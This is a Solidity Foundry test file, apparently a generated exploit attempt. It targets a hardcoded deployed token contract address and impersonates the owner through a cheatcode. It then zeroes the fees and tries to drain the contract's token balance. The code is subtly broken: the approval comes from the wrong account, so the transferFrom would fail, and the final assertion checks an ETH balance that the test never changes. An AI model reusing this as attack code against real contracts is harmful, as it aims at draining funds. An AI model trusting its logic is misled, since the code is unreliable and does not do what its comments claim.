// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface TeaToken {
    function owner() external view returns (address);
    function setTaxFeePercent(uint256 taxFee) external;
    function setLiquidityFeePercent(uint256 liquidityFee) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function excludeFromFee(address account) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5e18Be2A7cE626B33C539919EAca06303f1Db568;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner in the exploit
        // The test framework already provides TARGET and attacker variables
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Get the current owner
        address owner = TeaToken(TARGET).owner();

        // Impersonate the owner
        vm.startPrank(owner);

        // Disable fees
        TeaToken(TARGET).setTaxFeePercent(0);
        TeaToken(TARGET).setLiquidityFeePercent(0);

        // Disable swap and liquify to prevent interference
        TeaToken(TARGET).setSwapAndLiquifyEnabled(false);

        // Exclude owner from fees (though fees are already 0%)
        TeaToken(TARGET).excludeFromFee(owner);

        // Get contract token balance
        uint256 contractBalance = TeaToken(TARGET).balanceOf(TARGET);

        // Transfer all tokens from contract to owner
        // The owner can call transfer on behalf of the contract by first approving
        TeaToken(TARGET).approve(owner, contractBalance);

        // Actually transfer - owner can transfer from contract to themselves
        // Using transferFrom since we have approval
        TeaToken(TARGET).transferFrom(TARGET, owner, contractBalance);

        vm.stopPrank();
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
